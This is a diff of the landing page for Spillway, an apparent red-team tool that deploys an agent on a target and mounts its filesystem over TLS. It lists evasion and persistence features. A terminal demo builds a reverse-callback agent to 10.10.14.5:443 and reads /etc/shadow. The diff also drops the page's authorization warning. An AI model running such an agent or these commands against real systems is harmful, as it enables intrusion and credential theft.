@@ -3,837 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spillway — Reverse/Bind/Dormant FUSE Filesystem Mount</title>
-    <meta name="description" content="Deploy a small agent on the target, mount its entire filesystem locally via FUSE over TLS 1.3 with mutual PSK authentication. SSHFS without SSH, built for offense.">
-    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <title>Spillway — FUSE Filesystem for Offense</title>
+    <meta name="description" content="Mount their filesystem. Browse with your tools. Reverse/bind/dormant FUSE mount over TLS 1.3 with mutual PSK authentication.">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Inter,sans-serif' font-size='24' font-weight='800' fill='%2374c7ec'%3ES%3C/text%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --red: #f38ba8;
-            --maroon: #eba0ac;
-            --pink: #f5c2e7;
-            --mauve: #cba6f7;
-            --lavender: #b4befe;
-            --blue: #89b4fa;
-            --sapphire: #74c7ec;
-            --sky: #89dceb;
-            --teal: #94e2d5;
-            --green: #a6e3a1;
-            --yellow: #f9e2af;
-            --peach: #fab387;
-            --text: #cdd6f4;
-            --subtext1: #bac2de;
-            --subtext0: #a6adc8;
-            --overlay2: #9399b2;
-            --overlay1: #7f849c;
-            --overlay0: #6c7086;
-            --surface2: #585b70;
-            --surface1: #45475a;
-            --surface0: #313244;
-            --base: #1e1e2e;
-            --mantle: #181825;
-            --crust: #11111b;
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --accent1:#74c7ec;--accent2:#b4befe;--accentmid:#89b4fa;
+            --accentrgb:116,199,236;
+            --text:#cdd6f4;--sub1:#bac2de;--sub0:#a6adc8;
+            --ov2:#9399b2;--ov1:#7f849c;--ov0:#6c7086;
+            --sf2:#585b70;--sf1:#45475a;--sf0:#313244;
+            --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
+            --green:#a6e3a1;--yellow:#f9e2af;--red:#f38ba8;
+            --peach:#fab387;--mauve:#cba6f7;--teal:#94e2d5;
         }
+        body{font-family:'Inter',system-ui,sans-serif;background:var(--crust);color:var(--text);line-height:1.7;overflow-x:hidden}
+        ::selection{background:rgba(var(--accentrgb),0.3);color:var(--text)}
+        .container{max-width:1140px;margin:0 auto;padding:0 28px}
+        code{font-family:'JetBrains Mono',monospace;background:var(--mantle);padding:2px 7px;border-radius:3px;font-size:.88em;color:var(--green)}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: var(--base);
-            color: var(--text);
-            line-height: 1.7;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background-image: radial-gradient(circle, var(--overlay0) 1px, transparent 1px);
-            background-size: 24px 24px;
-            opacity: 0.15;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
-            pointer-events: none;
-            z-index: 999;
-            opacity: 0.4;
-        }
-
-        ::selection { background: rgba(116, 199, 236, 0.3); color: var(--text); }
-
-        code {
-            font-family: 'JetBrains Mono', monospace;
-            background: var(--mantle);
-            padding: 2px 7px;
-            border-radius: 3px;
-            font-size: 0.88em;
-            color: var(--green);
-        }
-
-        .container { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
+        /* ── Nav ── */
+        .nav{position:fixed;top:0;left:0;right:0;height:56px;background:rgba(17,17,27,0.8);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid rgba(49,50,68,0.5);z-index:1000;display:flex;align-items:center;justify-content:center}
+        .nav-inner{max-width:1140px;width:100%;padding:0 28px;display:flex;align-items:center;justify-content:space-between}
+        .nav-logo{font-family:'Inter',sans-serif;font-size:16px;font-weight:700;color:var(--text);text-decoration:none}
+        .nav-links{display:flex;align-items:center;gap:28px}
+        .nav-links a{font-size:13px;font-weight:500;color:var(--ov0);text-decoration:none;transition:color .2s}
+        .nav-links a:hover{color:var(--text)}
+        .nav-cta{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:7px 18px;border-radius:8px;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
+        .nav-cta:hover{box-shadow:0 0 20px rgba(var(--accentrgb),0.3);transform:translateY(-1px)}
 
         /* ── Hero ── */
-        .hero {
-            padding: 100px 0 70px;
-            text-align: center;
-            position: relative;
-        }
-
-        .hero::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 10%;
-            right: 10%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--surface1), transparent);
-        }
-
-        .hero-logo {
-            max-width: 440px;
-            margin: 0 auto 32px;
-        }
-
-        .hero-logo img { width: 100%; height: auto; }
-
-        .hero .subtitle {
-            font-size: clamp(15px, 2vw, 18px);
-            color: var(--subtext0);
-            max-width: 680px;
-            margin: 0 auto 28px;
-            line-height: 1.7;
-        }
-
-        .hero .warning {
-            background: rgba(243, 139, 168, 0.07);
-            border: 1px solid rgba(243, 139, 168, 0.3);
-            border-radius: 6px;
-            padding: 14px 24px;
-            margin: 28px auto;
-            max-width: 720px;
-            font-size: 13px;
-            line-height: 1.6;
-            color: var(--subtext1);
-        }
-
-        .hero .warning strong { color: var(--red); }
-
-        /* ── Stats ── */
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 16px;
-            margin: 48px 0;
-        }
-
-        .stat {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 20px 16px;
-            text-align: center;
-            transition: transform 0.2s, border-color 0.2s;
-        }
-
-        .stat:hover { transform: translateY(-2px); border-color: var(--surface2); }
-
-        .stat-value {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 28px;
-            font-weight: 700;
-            color: var(--sapphire);
-            line-height: 1;
-        }
-
-        .stat-label { font-size: 12px; color: var(--overlay1); margin-top: 6px; letter-spacing: 0.03em; }
-
-        /* ── CTAs ── */
-        .cta-group { display: flex; gap: 14px; justify-content: center; margin-top: 36px; }
-
-        .btn {
-            padding: 13px 32px;
-            border-radius: 6px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            font-weight: 600;
-            text-decoration: none;
-            letter-spacing: 0.03em;
-            transition: all 0.2s;
-            display: inline-block;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--sapphire), var(--blue));
-            color: var(--crust);
-        }
-
-        .btn-primary:hover {
-            box-shadow: 0 0 24px rgba(116, 199, 236, 0.35);
-            transform: translateY(-2px);
-        }
-
-        .btn-secondary {
-            background: var(--surface0);
-            color: var(--text);
-            border: 1px solid var(--surface1);
-        }
-
-        .btn-secondary:hover { background: var(--surface1); border-color: var(--surface2); }
-
-        .btn-ghost {
-            background: transparent;
-            color: var(--subtext1);
-            border: 1px solid var(--surface1);
-        }
-
-        .btn-ghost:hover { background: var(--surface0); color: var(--text); }
-
-        /* ── Section Headers ── */
-        .section { padding: 80px 0; }
-
-        .section-label {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.15em;
-            text-transform: uppercase;
-            color: var(--sapphire);
-            margin-bottom: 12px;
-        }
-
-        .section-title {
-            font-size: clamp(24px, 4vw, 36px);
-            font-weight: 800;
-            color: var(--text);
-            margin-bottom: 16px;
-            line-height: 1.2;
-        }
-
-        .section-desc {
-            font-size: 15px;
-            color: var(--subtext0);
-            max-width: 680px;
-            margin-bottom: 48px;
-            line-height: 1.7;
-        }
-
-        /* ── Mode Cards ── */
-        .modes-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-        }
-
-        .mode-card {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 28px 24px;
-            transition: all 0.25s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .mode-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            opacity: 0;
-            transition: opacity 0.25s;
-        }
-
-        .mode-card:hover {
-            border-color: var(--surface2);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 32px -8px rgba(0, 0, 0, 0.4);
-        }
-
-        .mode-card:hover::before { opacity: 1; }
-
-        .mode-card:nth-child(1)::before { background: linear-gradient(90deg, transparent, var(--sapphire), transparent); }
-        .mode-card:nth-child(2)::before { background: linear-gradient(90deg, transparent, var(--teal), transparent); }
-        .mode-card:nth-child(3)::before { background: linear-gradient(90deg, transparent, var(--lavender), transparent); }
-
-        .mode-card h3 {
-            font-size: 16px;
-            font-weight: 700;
-            color: var(--text);
-            margin-bottom: 8px;
-        }
-
-        .mode-card .mode-tag {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            color: var(--sapphire);
-            background: var(--mantle);
-            padding: 2px 8px;
-            border-radius: 3px;
-            display: inline-block;
-            margin-bottom: 12px;
-        }
-
-        .mode-card p {
-            font-size: 14px;
-            color: var(--subtext0);
-            line-height: 1.6;
-        }
-
-        /* ── Capabilities Pills ── */
-        .caps-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .cap-pill {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 20px;
-            padding: 8px 16px;
-            font-size: 13px;
-            color: var(--subtext1);
-            transition: all 0.2s;
-        }
-
-        .cap-pill:hover {
-            border-color: var(--surface2);
-            background: var(--mantle);
-        }
-
-        .cap-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            flex-shrink: 0;
-        }
-
-        .cap-dot.green { background: var(--green); }
-        .cap-dot.yellow { background: var(--yellow); }
-        .cap-dot.gray { background: var(--overlay0); }
-
-        /* ── Architecture ── */
-        .arch-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-        }
-
-        .arch-card {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 24px;
-            transition: all 0.25s;
-        }
-
-        .arch-card:hover {
-            border-color: var(--surface2);
-            transform: translateY(-2px);
-        }
-
-        .arch-num {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            font-weight: 700;
-            color: var(--crust);
-            background: var(--sapphire);
-            width: 28px;
-            height: 28px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 4px;
-            margin-bottom: 12px;
-        }
-
-        .arch-card:nth-child(2) .arch-num { background: var(--teal); }
-        .arch-card:nth-child(3) .arch-num { background: var(--blue); }
-        .arch-card:nth-child(4) .arch-num { background: var(--green); }
-
-        .arch-card h3 {
-            font-size: 15px;
-            font-weight: 700;
-            color: var(--text);
-            margin-bottom: 8px;
-        }
-
-        .arch-card p {
-            font-size: 13px;
-            color: var(--subtext0);
-            line-height: 1.6;
-        }
-
-        .arch-card code {
-            font-size: 12px;
-            color: var(--mauve);
-            background: var(--mantle);
-            padding: 1px 6px;
-            border-radius: 3px;
-        }
+        .hero{padding:140px 0 80px;text-align:center;position:relative}
+        .hero::before{content:'';position:absolute;top:60px;left:50%;transform:translateX(-50%);width:800px;height:400px;background:radial-gradient(ellipse,rgba(var(--accentrgb),0.08) 0%,transparent 60%);pointer-events:none}
+        .hero-logo{position:relative;max-width:600px;margin:0 auto 32px}
+        .hero-logo img{width:100%;height:auto}
+        .hero-tagline{position:relative;font-size:clamp(24px,3.5vw,38px);font-weight:700;line-height:1.2;margin-bottom:16px;background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+        .hero-desc{position:relative;font-size:16px;color:var(--ov0);max-width:560px;margin:0 auto 32px}
+        .hero-ctas{position:relative;display:flex;gap:12px;justify-content:center;margin-bottom:48px}
+        .btn-primary{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:12px 28px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
+        .btn-primary:hover{box-shadow:0 0 24px rgba(var(--accentrgb),0.35);transform:translateY(-2px)}
+        .btn-secondary{background:var(--sf0);color:var(--text);padding:12px 28px;border-radius:8px;border:1px solid var(--sf1);font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;text-decoration:none;transition:all .2s}
+        .btn-secondary:hover{background:var(--sf1);border-color:var(--sf2)}
 
         /* ── Terminal ── */
-        .terminal {
-            background: var(--mantle);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
-        }
+        .terminal{position:relative;max-width:800px;margin:0 auto;background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.5),0 0 24px rgba(var(--accentrgb),0.06)}
+        .terminal-bar{background:var(--crust);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--sf0)}
+        .terminal-dot{width:12px;height:12px;border-radius:50%}
+        .terminal-dot:nth-child(1){background:var(--red)}
+        .terminal-dot:nth-child(2){background:var(--yellow)}
+        .terminal-dot:nth-child(3){background:var(--green)}
+        .terminal-label{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)}
+        .terminal-body{padding:24px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.9;text-align:left}
+        .terminal-body pre{margin:0;white-space:pre-wrap;word-wrap:break-word}
+        .t-g{color:var(--green)}.t-b{color:var(--accent1)}.t-m{color:var(--sub0)}.t-p{color:var(--peach)}
 
-        .terminal-bar {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 16px;
-            background: var(--crust);
-            border-bottom: 1px solid var(--surface0);
-        }
+        /* ── Stats ── */
+        .stats{display:flex;justify-content:center;gap:40px;padding:60px 0;position:relative}
+        .stat{text-align:center}
+        .stat-num{font-family:'JetBrains Mono',monospace;font-size:36px;font-weight:700;color:var(--accent1);line-height:1}
+        .stat-label{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--sf2);margin-top:6px;letter-spacing:2px;text-transform:uppercase}
+        .stat-div{width:1px;height:48px;background:var(--sf0);align-self:center}
 
-        .terminal-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-        }
+        /* ── Sections ── */
+        section{padding:80px 0}
+        .section-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;color:var(--accent1);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
+        .section-title{font-size:clamp(28px,4vw,40px);font-weight:700;margin-bottom:12px;letter-spacing:-.02em}
+        .section-desc{font-size:15px;color:var(--ov0);margin-bottom:48px;max-width:560px}
+        .gradient-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin:0 auto;max-width:600px}
 
-        .terminal-dot:nth-child(1) { background: var(--red); }
-        .terminal-dot:nth-child(2) { background: var(--yellow); }
-        .terminal-dot:nth-child(3) { background: var(--green); }
+        /* ── Bento ── */
+        .bento{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+        .bento-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:all .25s;position:relative;overflow:hidden}
+        .bento-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent1),var(--accent2));opacity:0;transition:opacity .25s}
+        .bento-card:hover{transform:translateY(-3px);border-color:var(--sf1);box-shadow:0 12px 32px rgba(0,0,0,0.25),0 0 20px rgba(var(--accentrgb),0.06)}
+        .bento-card:hover::before{opacity:1}
+        .bento-hero{grid-column:span 2}
+        .bento-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--accent1);margin-bottom:8px}
+        .bento-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
+        .bento-card .mini-terminal{background:var(--crust);border-radius:8px;padding:14px;margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;text-align:left}
+        .bento-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
+        .bento-stat .big{font-family:'JetBrains Mono',monospace;font-size:42px;font-weight:700;color:var(--accent1)}
+        .bento-stat .label{font-size:12px;color:var(--sf2);margin-top:4px;letter-spacing:1px}
 
-        .terminal-label {
-            flex: 1;
-            text-align: center;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            color: var(--overlay0);
-        }
+        /* ── Arch ── */
+        .arch-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+        .arch-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:border-color .2s}
+        .arch-card:hover{border-color:var(--sf1)}
+        .arch-num{display:inline-flex;width:30px;height:30px;background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);border-radius:50%;align-items:center;justify-content:center;font-weight:700;font-size:14px;margin-bottom:14px}
+        .arch-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--teal);margin-bottom:8px}
+        .arch-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
 
-        .terminal-body {
-            padding: 24px 28px;
-        }
-
-        .terminal-body pre {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            line-height: 1.8;
-            color: var(--subtext0);
-        }
-
-        .terminal-body .c { color: var(--overlay0); }
-        .terminal-body .p { color: var(--green); }
-        .terminal-body .v { color: var(--sapphire); }
-        .terminal-body .f { color: var(--peach); }
-        .terminal-body .t { color: var(--text); }
-        .terminal-body .ok { color: var(--green); font-weight: 600; }
-
-        .terminal-two-col {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
+        /* ── Two Col ── */
+        .two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px}
 
         /* ── Detection ── */
-        .detect-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        .detect-card {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 24px;
-        }
-
-        .detect-card h3 {
-            font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 16px;
-        }
-
-        .detect-card.hidden h3 { color: var(--green); }
-        .detect-card.visible h3 { color: var(--yellow); }
-
-        .detect-card ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        .detect-card li {
-            font-size: 13px;
-            color: var(--subtext0);
-            padding: 6px 0;
-            border-bottom: 1px solid var(--surface1);
-            line-height: 1.5;
-        }
-
-        .detect-card li:last-child { border-bottom: none; }
+        .detect-card{background:var(--mantle);border-radius:12px;padding:28px}
+        .detect-card h3{font-size:14px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+        .detect-card ul{list-style:none;font-size:13px;color:var(--sub0);line-height:2.2}
+        .detect-hidden{border-left:3px solid var(--green)}.detect-hidden h3{color:var(--green)}
+        .detect-visible{border-left:3px solid var(--yellow)}.detect-visible h3{color:var(--yellow)}
 
         /* ── Footer ── */
-        .footer {
-            border-top: 1px solid var(--surface1);
-            padding: 64px 0 48px;
-            margin-top: 40px;
-        }
+        footer{padding:48px 0;margin-top:40px}
+        .footer-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin-bottom:48px}
+        .footer-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:32px}
+        .footer-grid h4{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);margin-bottom:14px;letter-spacing:2px;text-transform:uppercase}
+        .footer-grid ul{list-style:none}
+        .footer-grid li{margin-bottom:8px}
+        .footer-grid a{color:var(--ov2);text-decoration:none;font-size:13px;transition:color .2s}
+        .footer-grid a:hover{color:var(--accent1)}
+        .footer-grid p{font-size:13px;color:var(--ov1);line-height:1.7}
+        .footer-bottom{text-align:center;margin-top:36px;padding-top:24px;border-top:1px solid var(--sf0);font-size:12px;color:var(--ov0)}
 
-        .footer-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 40px;
-            margin-bottom: 48px;
-        }
-
-        .footer-col h4 {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: 0.15em;
-            text-transform: uppercase;
-            color: var(--overlay1);
-            margin-bottom: 16px;
-        }
-
-        .footer-col a {
-            display: block;
-            font-size: 13px;
-            color: var(--subtext0);
-            text-decoration: none;
-            padding: 4px 0;
-            transition: color 0.2s;
-        }
-
-        .footer-col a:hover { color: var(--sapphire); }
-
-        .footer-col p {
-            font-size: 13px;
-            color: var(--subtext0);
-            line-height: 1.6;
-        }
-
-        .footer-bottom {
-            text-align: center;
-            padding-top: 32px;
-            border-top: 1px solid var(--surface0);
-        }
-
-        .footer-bottom p {
-            font-size: 12px;
-            color: var(--overlay0);
-            line-height: 1.6;
-        }
-
-        .footer-bottom .disclaimer {
-            margin-top: 12px;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-            font-size: 11px;
-        }
+        /* ── Animate ── */
+        .animate{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease}
+        .animate.visible{opacity:1;transform:translateY(0)}
+        .animate-scale{opacity:0;transform:translateY(24px) scale(.97);transition:opacity .8s ease,transform .8s ease}
+        .animate-scale.visible{opacity:1;transform:translateY(0) scale(1)}
 
         /* ── Responsive ── */
-        @media (max-width: 900px) {
-            .stats { grid-template-columns: repeat(2, 1fr); }
-            .modes-grid { grid-template-columns: 1fr; }
-            .arch-grid { grid-template-columns: 1fr; }
-            .terminal-two-col { grid-template-columns: 1fr; }
-            .detect-grid { grid-template-columns: 1fr; }
-            .footer-grid { grid-template-columns: repeat(2, 1fr); }
-        }
+        @media(max-width:960px){.bento{grid-template-columns:1fr 1fr}.bento-hero{grid-column:span 2}.two-col,.arch-grid{grid-template-columns:1fr}.footer-grid{grid-template-columns:repeat(2,1fr)}.stats{flex-wrap:wrap;gap:24px}}
+        @media(max-width:600px){.container{padding:0 16px}.hero{padding:100px 0 48px}.bento{grid-template-columns:1fr}.bento-hero{grid-column:span 1}.stats{gap:16px}.stat-div{display:none}.nav-links a:not(.nav-cta){display:none}.footer-grid{grid-template-columns:1fr}}
 
-        @media (max-width: 600px) {
-            .stats { grid-template-columns: 1fr 1fr; }
-            .cta-group { flex-direction: column; align-items: center; }
-            .btn { width: 100%; max-width: 280px; text-align: center; }
-            .footer-grid { grid-template-columns: 1fr; }
-        }
+        a:focus-visible{outline:2px solid var(--accent1);outline-offset:2px}
     </style>
 </head>
 <body>
+
+    <!-- Nav -->
+    <nav class="nav"><div class="nav-inner">
+        <a href="#" class="nav-logo">Spillway</a>
+        <div class="nav-links">
+            <a href="#features">Features</a>
+            <a href="#architecture">Architecture</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Spillway">GitHub</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Spillway" class="nav-cta">View Source</a>
+        </div>
+    </div></nav>
+
+    <!-- Hero -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-logo animate"><img src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-dark.svg" alt="Spillway"></div>
+            <h1 class="hero-tagline animate" style="transition-delay:.1s">Mount their filesystem. Browse with your tools.</h1>
+            <p class="hero-desc animate" style="transition-delay:.2s">Deploy a small agent on the target, mount its entire filesystem locally via FUSE over TLS 1.3 with mutual PSK authentication. SSHFS without SSH, built for offense.</p>
+            <div class="hero-ctas animate" style="transition-delay:.3s">
+                <a href="https://github.com/Real-Fruit-Snacks/Spillway" class="btn-primary">View Source</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/README.md" class="btn-secondary">Documentation</a>
+            </div>
+            <div class="terminal animate-scale" style="transition-delay:.4s">
+                <div class="terminal-bar">
+                    <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
+                    <span class="terminal-label">spillway</span>
+                </div>
+                <div class="terminal-body"><pre><span class="t-m"># Build agent, start listener</span>
+<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443
+<span class="t-b">[+] Built bin/spillway-agent-linux-amd64</span>
+
+<span class="t-g">$</span> ./bin/spillway listen --port 443 --mount ./target
+<span class="t-b">[*] Listening on :443</span>
+<span class="t-b">[+] Agent connected from 10.129.2.47</span>
+
+<span class="t-m"># Browse the remote filesystem</span>
+<span class="t-g">$</span> ls ./target/etc/
+<span class="t-p">crontab  group  hostname  hosts  passwd  shadow  ssh/</span>
+
+<span class="t-g">$</span> cat ./target/etc/shadow
+<span class="t-p">root:$6$rounds=65536$salt$hash...:19000:0:99999:7:::</span></pre></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats -->
     <div class="container">
-
-        <!-- ── Hero ── -->
-        <section class="hero">
-            <div class="hero-logo">
-                <img src="assets/logo-dark.svg" alt="Spillway">
-            </div>
-            <p class="subtitle">
-                Deploy a small agent on the target. Mount its entire filesystem locally via FUSE.
-                Browse with <code>ls</code>, <code>cat</code>, <code>grep</code>, <code>find</code> — any tool that reads files.
-                Over TLS 1.3 with mutual PSK authentication.
-            </p>
-
-            <div class="warning">
-                <strong>Authorization Required</strong> — This tool is designed exclusively for authorized security testing
-                with explicit written permission. Unauthorized access to computer systems is illegal.
-            </div>
-
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-value">17</div>
-                    <div class="stat-label">FS Operations</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-value" style="color: var(--teal)">3</div>
-                    <div class="stat-label">Connection Modes</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-value" style="color: var(--green)">133</div>
-                    <div class="stat-label">Tests Passing</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-value" style="color: var(--peach)">5</div>
-                    <div class="stat-label">Platform Targets</div>
-                </div>
-            </div>
-
-            <div class="cta-group">
-                <a href="https://github.com/Real-Fruit-Snacks/Spillway" class="btn btn-primary">View Source</a>
-                <a href="#quickstart" class="btn btn-secondary">Quick Start</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Spillway/blob/main/README.md" class="btn btn-ghost">Documentation</a>
-            </div>
-        </section>
-
-        <!-- ── Modes ── -->
-        <section class="section">
-            <div class="section-label">// modes</div>
-            <h2 class="section-title">Three ways in</h2>
-            <p class="section-desc">
-                Reverse, bind, or dormant. The agent adapts to your engagement requirements.
-                All modes use TLS 1.3 with mutual PSK authentication.
-            </p>
-
-            <div class="modes-grid">
-                <div class="mode-card">
-                    <span class="mode-tag">reverse</span>
-                    <h3>Reverse Mode</h3>
-                    <p>Agent calls back to your listener. You get a FUSE mount of the remote filesystem. The most common mode for red team engagements — agent initiates, firewall-friendly.</p>
-                </div>
-                <div class="mode-card">
-                    <span class="mode-tag">bind</span>
-                    <h3>Bind Mode</h3>
-                    <p>Agent listens on the target. You connect and mount the filesystem. Useful when you have direct network access to the target and need on-demand filesystem access.</p>
-                </div>
-                <div class="mode-card">
-                    <span class="mode-tag">dormant</span>
-                    <h3>Dormant Mode</h3>
-                    <p>Agent sits silent with no open ports. An authenticated UDP knock triggers a reverse callback. Zero network footprint until activated — ideal for persistence.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- ── Capabilities ── -->
-        <section class="section">
-            <div class="section-label">// capabilities</div>
-            <h2 class="section-title">What you get</h2>
-            <p class="section-desc">
-                A real FUSE mountpoint backed by 17 filesystem operations. Everything encrypted, everything authenticated.
-            </p>
-
-            <div class="caps-grid">
-                <div class="cap-pill"><span class="cap-dot green"></span>Full FUSE mount</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>TLS 1.3 encryption</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Mutual PSK auth</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>17 filesystem ops</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Path jailing</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Symlink resolution</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Process masquerade</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Self-delete</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Core dump prevention</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Rate limiting</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>HTTP CONNECT proxy</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Zero runtime args</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Cross-platform agent</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Static binary</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Extended attributes</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>SNI domain fronting</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>Cert fingerprint pinning</div>
-                <div class="cap-pill"><span class="cap-dot yellow"></span>Dormant knock (Linux only)</div>
-                <div class="cap-pill"><span class="cap-dot yellow"></span>Read-only mode</div>
-                <div class="cap-pill"><span class="cap-dot green"></span>UPX compression</div>
-            </div>
-        </section>
-
-        <!-- ── Architecture ── -->
-        <section class="section">
